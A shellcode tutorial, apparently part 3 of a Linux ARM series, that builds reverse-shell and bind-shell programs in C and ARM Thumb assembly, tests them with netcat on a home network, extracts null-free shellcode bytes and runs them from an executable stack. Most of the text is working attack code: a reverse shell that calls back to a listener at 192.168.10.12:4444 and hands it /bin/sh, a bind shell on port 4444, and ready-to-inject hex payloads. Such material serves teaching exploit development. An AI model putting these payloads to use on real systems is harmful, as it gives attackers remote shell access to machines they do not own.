> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [jumpnowtek.com](https://jumpnowtek.com/shellcode/linux-arm-shellcode-part3.html)

Some more useful examples of shellcode are a [bind-shell](https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/) and a [reverse-shell](https://azeria-labs.com/tcp-reverse-shell-in-assembly-arm-32-bit/).

Metasploit has some more documentation on their wiki [How to use a reverse shell in Metasploit](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit).

If you have done any C socket programming, then the concepts are pretty basic.

The only new idea might be the remapping of stdio to the socket followed with the launching of a shell.

A **bind-shell** is a tcp server with stdio mapped to the client socket after it connects before a new shell is started. The remote client gets shell access to the target through the network socket.

The syscalls needed for a **bind-shell** are

*   socket
*   bind
*   listen
*   accept
*   dup2
*   execve

A **reverse-shell** is even simpler, but requires a remote listener for the target to connect to. The target makes a network connection to the remote, maps the socket descriptor to stdio and launches a shell.

The syscalls needed for a **reverse-shell** are

*   socket
*   connect
*   dup2
*   execve

For both of these examples the new assembly language concepts are

1.  Moving an immediate constant greater then 255 to a register
    
2.  Saving the return value from a syscall
    
3.  Working with a C struct data object
    

Starting with the **reverse-shell** since the code is smaller, this is the equivalent C code

```
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

int main()
{
    struct sockaddr_in sa;

    int fd = socket(AF_INET, SOCK_STREAM, 0);

    sa.sin_family = AF_INET;
    sa.sin_port = htons(4444);
    sa.sin_addr.s_addr = inet_addr("192.168.10.12");

    connect(fd, (struct sockaddr *)&sa, sizeof(sa));

    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    execve("/bin/sh", 0, 0);

    return 0;
}


```

Start a listener on the remote machine 192.168.10.12. I am using openbsd-netcat.

Compile and run the reverse-shell program

```
target:$ gcc main.c -o rshell
target:$ ./rshell


```

Then on the remote machine in the shell you started the listener you can now run commands on the target

```
remote:$ nc -l 4444
ls
main.c
rshell
uname -a
Linux wandq-2 4.19.12-jumpnow #1 SMP Sat Dec 22 09:14:15 UTC 2018 armv7l armv7l armv7l GNU/Linux
^C


```

We need to know a little more about the **struct sockaddr_in** data to work with it in assembler.

I added some printfs to the code to look at it.

```
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

int main()
{
    struct sockaddr_in sa;

    int fd = socket(AF_INET, SOCK_STREAM, 0);

    memset(&sa, 0xff, sizeof(sa));

    sa.sin_family = AF_INET;
    sa.sin_port = htons(4444);
    sa.sin_addr.s_addr = inet_addr("192.168.10.12");

    connect(fd, (struct sockaddr *)&sa, sizeof(sa));

    printf("sizeof(sa) = %d\n", sizeof(sa));

    unsigned char *p = (unsigned char *)&sa;

    for (int i = 0; i < sizeof(sa); i++)
        printf(" %02x", p[i]);

    printf("\n");

    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    execve("/bin/sh", 0, 0);

    return 0;
}

$ gcc main.c -o rshell
$ ./rshell
sizeof(sa) = 16
 02 00 11 5c c0 a8 0a 0c ff ff ff ff ff ff ff ff


```

Note that

```
AF_INET = 2
SOCK_STREAM = 0
4444 = 0x115c
192.168.10.12 => c0:a8:0a:0c


```

This is the data in the first 8 bytes of the sa struct.

There is one **0x00** in the second byte that will have to be dealt similar to the NULL byte at the end of a string.

More interesting is that the last 8 bytes of the struct are not used. It’s not immediately obvious, but the fact that in the first example we did not initialize the struct and in the second case we initialized with **0xff** and it worked both times is a clue.

Instead of a **struct sockaddr_in**, we could just have a byte buffer like this

```
#include <unistd.h>
#include <sys/socket.h>

int main()
{
    unsigned char sa[16] = {
        0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x0a, 0x0c,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

    int fd = socket(AF_INET, SOCK_STREAM, 0);

    connect(fd, (struct sockaddr *)&sa, sizeof(sa));

    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    execve("/bin/sh", 0, 0);

    return 0;
}


```

Or this

```
unsigned char sa[16] = {
    0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x0a, 0x0c,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };


```

or even something semi-random like this

```
unsigned char sa[16] = {
    0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x0a, 0x0c,
    '/', 'b', 'i', 'n', '/', 's', 'h', 'A' };


```

and the program still works.

This last hack is not necessary, but will save 8 bytes in the resulting shellcode.

The syscall numbers for the socket functions are bigger then those used in the previous examples.

```
#define __NR_socket (__NR_SYSCALL_BASE + 281)
#define __NR_bind (__NR_SYSCALL_BASE + 282)
#define __NR_connect (__NR_SYSCALL_BASE + 283)
#define __NR_listen (__NR_SYSCALL_BASE + 284)
#define __NR_accept (__NR_SYSCALL_BASE + 285)


```

The arm instruction set has [limitations on immediate constants](http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0473e/Chdfgchf.html) that can be used with a **mov** instruction. Values 0-255 are not a problem and can be handled directly.

For the syscall numbers needed for these examples, two instructions can be used

So here is an assembly version of the same **reverse-shell** C code

```
.text
.global _start

_start:
    add r1, pc, #1
    bx r1

.code 16
    adr r0, _sa
    eor r2, r2, r2
    @ replace the 0xff in the first word with 0x00
    strb r2, [r0, #1]
    @ null terminate the /bin/sh string
    strb r2, [r0, #15]

    @ syscall #281 socket(AF_INET, SOCK_STREAM, 0)
    mov r0, #2
    mov r1, #1
    @ r2 is already zero
    mov r7, #200
    add r7, #81
    svc #1

    @ save socket
    mov r4, r0

    @ syscall #283 connect(sock, &sa, 16)
    mov r0, r4
    adr r1, _sa
    mov r2, #16
    add r7, #2
    svc #1

    @ syscall #63 dup2(sock, stdin)
    mov r0, r4
    eor r1, r1, r1
    mov r7, #63
    svc #1

    @ dup2(sock, stdout)
    mov r0, r4
    mov r1, #1
    svc #1

    @ dup2(sock, stderr)
    mov r0, r4
    mov r1, #2
    svc #1

    @ syscall #11 execve("/bin/sh", 0, 0)
    adr r0, _string
    eor r1, r1, r1
    eor r2, r2, r2
    mov r7, #11
    svc #1

_sa:
.word 0x5c11ff02
.word 0x0c0aa8c0

_string:
.ascii "/bin/shA"


```

Start the listener on the remote machine and it works just as the C program did.

```
$ as reverse-shell.s -o reverse-shell.o
$ ld -N reverse-shell.o -o reverse-shell
$ ./reverse-shell


```

Extract the shellcode for later.

```
$ objcopy -O binary reverse-shell.o reverse-shell.bin

$ hexdump -v -e '"\\\x" 1/1 "%02x"' reverse-shell.bin ; echo
\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x0e\xa0\x52\x40\x42\x70\xc2\x73\x02\x20\x01\x21\xc8\x27\x51\x37\x01\xdf\x04\x1c\x20\x1c\x09\xa1\x10\x22\x02\x37\x01\xdf\x20\x1c\x49\x40\x3f\x27\x01\xdf\x20\x1c\x01\x21\x01\xdf\x20\x1c\x02\x21\x01\xdf\x04\xa0\x49\x40\x52\x40\x0b\x27\x01\xdf\x02\xff\x11\x5c\xc0\xa8\x0a\x0c\x2f\x62\x69\x6e\x2f\x73\x68\x41


```

The **bind-shell** example is longer, but does not involve anything new.

Here is the C version

```
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main()
{
    struct sockaddr_in sa;

    sa.sin_family = AF_INET;
    sa.sin_port = htons(4444);
    sa.sin_addr.s_addr = htonl(INADDR_ANY);

    int ssock = socket(PF_INET, SOCK_STREAM, 0);

    bind(ssock, (struct sockaddr*) &sa, sizeof(sa));

    listen(ssock, 1);

    int csock = accept(ssock, NULL, NULL);

    dup2(csock, 0);
    dup2(csock, 1);
    dup2(csock, 2);

    execve("/bin/sh", NULL, NULL);

    return 0;
}


```

Build and run

```
target:$ gcc bindshell.c -o bindshell
target:$ ./bindshell


```

Connect from a remote client using netcat as a client. The target ARM machine is at 192.168.10.221.

```
remote:$ nc 192.168.10.221 4444
uname -a
Linux wandq-2 4.19.12-jumpnow #1 SMP Sat Dec 22 09:14:15 UTC 2018 armv7l armv7l armv7l GNU/Linux
exit


```

Setting the IP address to **INADDR_ANY** means **0.0.0.0** or listen on every interface.

Here is an assembler version of the same program

```
.text
.global _start

_start:
    add r1, pc, #1
    bx r1

.code 16
    @ initialize the sa struct, AF_INET, 0.0.0.0
    adr r0, _sa
    eor r2, r2, r2
    @ replace the 0xff in the first word with 0x00
    strb r2, [r0, #1]
    @ set the ip address to 0.0.0.0
    str r2, [r0, #4]
    @ null terminate the /bin/sh string
    strb r2, [r0, #15]

    @ syscall #281 socket(AF_INET, SOCK_STREAM, 0)
    mov r0, #2
    mov r1, #1
    @ r2 is already zero
    mov r7, #200
    add r7, #81
    svc #1

    @ save server socket
    mov r4, r0

    @ syscall #282 bind(sock, &sa, 16)
    @ r0 still has socket
    adr r1, _sa
    mov r2, #16
    add r7, #1
    svc #1

    @ syscall #284 listen(sock, 1)
    mov r0, r4
    mov r1, #1
    add r7, #2
    svc #1

    @ syscall #285 accept(sock, 0, 0)
    mov r0, r4
    eor r1, r1, r1
    eor r2, r2, r2
    add r7, #1
    svc #1

    @ save client socket
    mov r4, r0

    @ syscall #63 dup2(sock, stdin)
    mov r0, r4
    eor r1, r1, r1
    mov r7, #63
    svc #1

    @ dup2(sock, stdout)
    mov r0, r4
    mov r1, #1
    svc #1

    @ dup2(sock, stderr)
    mov r0, r4
    mov r1, #2
    svc #1

    @ syscall #11 execve("/bin/sh", 0, 0)
    adr r0, _string
    eor r1, r1, r1
    eor r2, r2, r2
    mov r7, #11
    svc #1

_sa:
.word 0x5c11ff02
.word 0xffffffff

_string:
.ascii "/bin/shA"


```

A quick test

```
$ as bindshell.s -o bindshell.o
$ ld -N bindshell.o -o bindshell
$ ./bindshell


```

On the remote

```
remote:$ nc 192.168.10.221 4444
uname -a
Linux wandq-2 4.19.12-jumpnow #1 SMP Sat Dec 22 09:14:15 UTC 2018 armv7l armv7l armv7l GNU/Linux
exit


```

Extract the shellcode for later.

```
$ objcopy -O binary bindshell.o bindshell.bin

$ hexdump -v -e '"\\\x" 1/1 "%02x"' bindshell.bin ; echo
\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x13\xa0\x52\x40\x42\x70\x42\x60\xc2\x73\x02\x20\x01\x21\xc8\x27\x51\x37\x01\xdf\x04\x1c\x0e\xa1\x10\x22\x01\x37\x01\xdf\x20\x1c\x01\x21\x02\x37\x01\xdf\x20\x1c\x49\x40\x52\x40\x01\x37\x01\xdf\x04\x1c\x20\x1c\x49\x40\x3f\x27\x01\xdf\x20\x1c\x01\x21\x01\xdf\x20\x1c\x02\x21\x01\xdf\x04\xa0\x49\x40\x52\x40\x0b\x27\x01\xdf\x02\xff\x11\x5c\xff\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41


```

And finally a short test program to verify the shellcode can run from the stack

```
#include <stdio.h>
#include <string.h>

// #define SIMPLE_SHELL
// #define REVERSE_SHELL
#define BIND_SHELL

#if defined(SIMPLE_SHELL)

char *shellcode =
"\x01\x10\x8f\xe2\x11\xff\x2f\xe1"
"\x02\xa0\x49\x40\x52\x40\x0b\x27"
"\x01\xdf\x41\x41\x2f\x62\x69\x6e"
"\x2f\x73\x68";

#elif defined(REVERSE_SHELL)

char *shellcode =
"\x01\x10\x8f\xe2\x11\xff\x2f\xe1"
"\x0e\xa0\x52\x40\x42\x70\xc2\x73"
"\x02\x20\x01\x21\xc8\x27\x51\x37"
"\x01\xdf\x04\x1c\x20\x1c\x09\xa1"
"\x10\x22\x02\x37\x01\xdf\x20\x1c"
"\x49\x40\x3f\x27\x01\xdf\x20\x1c"
"\x01\x21\x01\xdf\x20\x1c\x02\x21"
"\x01\xdf\x04\xa0\x49\x40\x52\x40"
"\x0b\x27\x01\xdf\x02\xff\x11\x5c"
"\xc0\xa8\x0a\x0c\x2f\x62\x69\x6e"
"\x2f\x73\x68\x41";

#elif defined(BIND_SHELL)

char *shellcode =
"\x01\x10\x8f\xe2\x11\xff\x2f\xe1"
"\x13\xa0\x52\x40\x42\x70\x42\x60"
"\xc2\x73\x02\x20\x01\x21\xc8\x27"
"\x51\x37\x01\xdf\x04\x1c\x0e\xa1"
"\x10\x22\x01\x37\x01\xdf\x20\x1c"
"\x01\x21\x02\x37\x01\xdf\x20\x1c"
"\x49\x40\x52\x40\x01\x37\x01\xdf"
"\x04\x1c\x20\x1c\x49\x40\x3f\x27"
"\x01\xdf\x20\x1c\x01\x21\x01\xdf"
"\x20\x1c\x02\x21\x01\xdf\x04\xa0"
"\x49\x40\x52\x40\x0b\x27\x01\xdf"
"\x02\xff\x11\x5c\xff\xff\xff\xff"
"\x2f\x62\x69\x6e\x2f\x73\x68\x41";

#endif


int main()
{
    char payload[128];

    strcpy(payload, shellcode);

    printf("length = %d\n", strlen(payload));

    (*(void(*)()) payload) ();
}


```

Make sure to enable an executable stack when linking.

```
$ gcc shelltest.c -o shelltest -z execstack


```